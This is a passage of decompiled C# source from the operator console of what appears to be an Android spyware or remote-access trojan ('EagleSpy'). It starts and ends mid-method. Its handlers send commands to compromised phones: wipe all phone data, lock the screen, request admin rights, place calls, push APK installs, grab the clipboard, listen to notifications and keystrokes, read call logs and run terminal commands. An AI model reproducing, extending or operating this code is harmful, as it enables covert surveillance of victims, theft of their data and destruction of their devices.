								string name = "Auto_Clicker_" + client.ClientRemoteAddress;
								Auto_Clicker auto_Clicker = (Auto_Clicker)MyProject.Application.OpenForms[name];
								if (auto_Clicker != null)
								{
									break;
								}
								new Auto_Clicker
								{
									Name = name,
									Classclient = client
								}.Show();
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600041E RID: 1054 RVA: 0x0005D1FC File Offset: 0x0005B3FC
	private void RequestAdminRightsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600041F RID: 1055 RVA: 0x0005D3DC File Offset: 0x0005B5DC
	private void LockScreenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"adm<*>lck<*>",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000420 RID: 1056 RVA: 0x0005D5C0 File Offset: 0x0005B7C0
	private void ToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								MsgBoxResult msgBoxResult = Interaction.MsgBox("All Phone Data Will be Removed\r\nAre you sure you want to Continue", MsgBoxStyle.YesNo, "Alert");
								MsgBoxResult msgBoxResult2 = msgBoxResult;
								if (msgBoxResult2 != MsgBoxResult.Yes)
								{
									if (msgBoxResult2 == MsgBoxResult.No)
									{
										break;
									}
								}
								else
								{
									string[] array = client.Keys.Split(new char[]
									{
										':'
									});
									object[] parametersObjects = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient2,
											Data.SPL_SOCKET,
											"adm<*>wip<*>",
											Data.SPL_SOCKET,
											array[0],
											Data.SPL_SOCKET,
											array[1],
											Data.SPL_SOCKET,
											SecurityKey.Lockscreen,
											Data.SPL_SOCKET,
											Conversions.ToString(0),
											Data.SPL_SOCKET,
											Conversions.ToString(0),
											Data.SPL_SOCKET,
											Data.SPL_ARRAY,
											Data.SPL_SOCKET,
											client.ClientRemoteAddress
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(parametersObjects);
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000421 RID: 1057 RVA: 0x0005D7C8 File Offset: 0x0005B9C8
	private void ToolStripMenuItem5_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								CallPhone callPhone = new CallPhone();
								callPhone.L0.Text = "add Number";
								callPhone.StartPosition = FormStartPosition.Manual;
								callPhone.Location = Codes.FixSize(Data.MainForm, callPhone);
								if (callPhone.ShowDialog() == DialogResult.OK)
								{
									string text = callPhone.TextBox1.Text;
									string call = callPhone._Call;
									callPhone.Close();
									if (Operators.CompareString(text, null, false) != 0)
									{
										try
										{
											if (client != null)
											{
												object[] parametersObjects = new object[]
												{
													myClient,
													string.Concat(new string[]
													{
														SecurityKey.KeysClient1,
														Data.SPL_SOCKET,
														reso.domen,
														".info",
														Data.SPL_SOCKET,
														"method",
														Data.SPL_SOCKET,
														SecurityKey.resultClient,
														Data.SPL_SOCKET,
														call,
														Data.SPL_DATA,
														"tel:",
														text.Trim()
													}),
													Codes.Encoding().GetBytes("null"),
													client
												};
												client.SendMessage(parametersObjects);
											}
										}
										finally
										{
										}
									}
								}
								else
								{
									callPhone.Close();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000422 RID: 1058 RVA: 0x0005DA14 File Offset: 0x0005BC14
	private void ToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter APK Link";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"msg:",
										reso.ChekLink(dialog.Mytext.Text),
										":up",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000423 RID: 1059 RVA: 0x0005DC40 File Offset: 0x0005BE40
	private void ToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter Messege";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"msg:",
										dialog.Mytext.Text,
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000424 RID: 1060 RVA: 0x0005DE60 File Offset: 0x0005C060
	private void ToolStripMenuItem8_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getClipboard,
										Data.SPL_SOCKET,
										"get",
										Data.SPL_DATA,
										"null"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000425 RID: 1061 RVA: 0x0005DFFC File Offset: 0x0005C1FC
	private void ToolStripMenuItem9_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter Link";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"lnk<*>",
										reso.ChekLink(dialog.Mytext.Text),
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000426 RID: 1062 RVA: 0x0005E220 File Offset: 0x0005C420
	private void NotificationListnerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Notifications_" + client.ClientAddressIP;
								Eaglepopup eaglepopup = (Eaglepopup)MyProject.Application.OpenForms[name];
								if (eaglepopup == null)
								{
									new Eaglepopup
									{
										Location = this.ClientsWindow.PointToScreen(this.ClientsWindow.GetCellDisplayRectangle(0, dataGridViewRow.Index, false).Location),
										ClassClient = client
									}.Show();
									dataGridViewRow.Cells[8].Value = Codes.BlankImage();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000427 RID: 1063 RVA: 0x0005E3A0 File Offset: 0x0005C5A0
	private void CallsListnerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Calls_Log_" + client.ClientAddressIP;
								EagleSpyCallLogs eagleSpyCallLogs = (EagleSpyCallLogs)MyProject.Application.OpenForms[name];
								if (eagleSpyCallLogs == null)
								{
									eagleSpyCallLogs = new EagleSpyCallLogs();
									eagleSpyCallLogs.Location = this.ClientsWindow.PointToScreen(this.ClientsWindow.GetCellDisplayRectangle(0, dataGridViewRow.Index, false).Location);
									eagleSpyCallLogs.ClassClient = client;
									dataGridViewRow.Cells[9].Value = Codes.BlankImage();
									eagleSpyCallLogs.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000428 RID: 1064 RVA: 0x0005E524 File Offset: 0x0005C724
	private void PhoneInformationToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Information,
										Data.SPL_SOCKET,
										"information"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000429 RID: 1065 RVA: 0x0005E6B0 File Offset: 0x0005C8B0
	private void ToolStripMenuItem15_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								EagleAlert.Showinformation("the tool is under maintenance ");
								break;
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600042A RID: 1066 RVA: 0x0005E77C File Offset: 0x0005C97C
	private void ToolStripMenuItem16_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									SecurityKey.KeysClient5 + Data.SPL_SOCKET + "10000",
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
								client.Close(myClient);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600042B RID: 1067 RVA: 0x0005E89C File Offset: 0x0005CA9C
	private void ToolStripMenuItem17_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								client.Blockme(client.ClientAddressIP);
								client.Close(client.myClient);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600042C RID: 1068 RVA: 0x0005E97C File Offset: 0x0005CB7C
	private void ToolStripMenuItem18_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"kill<*>x",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										"0",
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600042D RID: 1069 RVA: 0x0005EB48 File Offset: 0x0005CD48
	private void ToolStripMenuItem11_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "SelfRemove_" + client.ClientAddressIP;
								SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
								if (selfRemove == null)
								{
									new SelfRemove
									{
										Classclient = client
									}.Show();
								}
								else
								{
									selfRemove.BringToFront();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600042E RID: 1070 RVA: 0x0005EC64 File Offset: 0x0005CE64
	private void KeyboardToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Keyboard_Manager" + client.ClientRemoteAddress;
								KeyboardManager keyboardManager = (KeyboardManager)MyProject.Application.OpenForms[name];
								if (keyboardManager != null)
								{
									keyboardManager.BringToFront();
									break;
								}
								new KeyboardManager
								{
									Name = name,
									Tag = client.ClientAddressIP,
									Classclient = client
								}.Show();
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"KBO<*>lod",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600042F RID: 1071 RVA: 0x0005EEAC File Offset: 0x0005D0AC
	private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							try
							{
								if (client != null)
								{
									string folderUSER = client.FolderUSER;
									if (!Directory.Exists(folderUSER))
									{
										Directory.CreateDirectory(folderUSER);
									}
									Process.Start(folderUSER);
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000430 RID: 1072 RVA: 0x0005EFA4 File Offset: 0x0005D1A4
	private void ToolStripMenuItem12_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Permissions_Manager" + client.ClientRemoteAddress;
								PermissionsManager permissionsManager = (PermissionsManager)MyProject.Application.OpenForms[name];
								if (permissionsManager != null)
								{
									permissionsManager.BringToFront();
									break;
								}
								new PermissionsManager
								{
									Name = name,
									Tag = client.ClientAddressIP,
									Classclient = client
								}.Show();
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"RPM<*>[lod]",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
								EagleAlert.ShowSucess("Loading Permissions Started...");
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000431 RID: 1073 RVA: 0x0005F1F8 File Offset: 0x0005D3F8
	private void ToolStripMenuItem10_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".terminal",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getCommand,
										Data.SPL_SOCKET,
										"run"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000432 RID: 1074 RVA: 0x0005F384 File Offset: 0x0005D584
	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				if (client.isconnected)
				{
					TcpClient myClient = client.myClient;
					object[] parametersObjects = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient1,
							Data.SPL_SOCKET,
							reso.domen,
							".info",
							Data.SPL_SOCKET,
							"method",
							Data.SPL_SOCKET,
							SecurityKey.getClipboard,
							Data.SPL_SOCKET,
							"get",
							Data.SPL_DATA,
							"null"
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000433 RID: 1075 RVA: 0x0005F4B8 File Offset: 0x0005D6B8
	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				if (client.isconnected)
				{
					string name = "Permissions_Manager" + client.ClientRemoteAddress;
					PermissionsManager permissionsManager = (PermissionsManager)MyProject.Application.OpenForms[name];
					if (permissionsManager == null)
					{
						new PermissionsManager
						{
							Name = name,
							Tag = client.ClientAddressIP,
							Classclient = client
						}.Show();
						TcpClient myClient = client.myClient;
						string[] array = client.Keys.Split(new char[]
						{
							':'
						});
						object[] parametersObjects = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"RPM<*>[lod]",
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								client.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
						EagleAlert.ShowSucess("Loading Permissions Started...");
					}
					else
					{
						permissionsManager.BringToFront();
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000434 RID: 1076 RVA: 0x0005F6A4 File Offset: 0x0005D8A4
	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				if (client.isconnected)
				{
					string name = "SelfRemove_" + client.ClientAddressIP;
					SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
					if (selfRemove == null)
					{
						new SelfRemove
						{
							Classclient = client
						}.ShowDialog();
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000435 RID: 1077 RVA: 0x0005F768 File Offset: 0x0005D968
	private void DrakeUIButtonIcon6_Click_1(object sender, EventArgs e)
	{
		try
		{
			if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				if (client.isconnected)
				{
					TcpClient myClient = client.myClient;
					Dialog1 dialog = new Dialog1();
					dialog.Title = "Enter Messege";
					dialog.ShowDialog();
					if (dialog.DialogResult == DialogResult.OK)
					{
						string[] array = client.Keys.Split(new char[]
						{
							':'
						});
						object[] parametersObjects = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"msg:",
								dialog.Mytext.Text,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								client.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000436 RID: 1078 RVA: 0x0000206C File Offset: 0x0000026C
	private void ClientsWindow_CellContentClick(object sender, DataGridViewCellEventArgs e)
	{
	}

	// Token: 0x06000437 RID: 1079 RVA: 0x0005F91C File Offset: 0x0005DB1C
	private void DrakeUIButtonIcon7_Click_1(object senderx, EventArgs ex)
	{
		this.ClientsWindow.BringToFront();
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				this.bigtitletext.Text = "Clients";
			}
			else
			{
				this.bigtitletext.Text = "客户";
			}
		}
		else
		{
			this.bigtitletext.Text = "عملاء";
		}
		if (RegistryHandler.GET_FTtip() == null)
		{
			RegistryHandler.Set_FTtip("Shown");
		}
	}

	// Token: 0x06000438 RID: 1080 RVA: 0x0005F9A4 File Offset: 0x0005DBA4
	private void DrakeUIButtonIcon10_Click_1(object sender, EventArgs e)
	{
		this.DGVblocked.BringToFront();
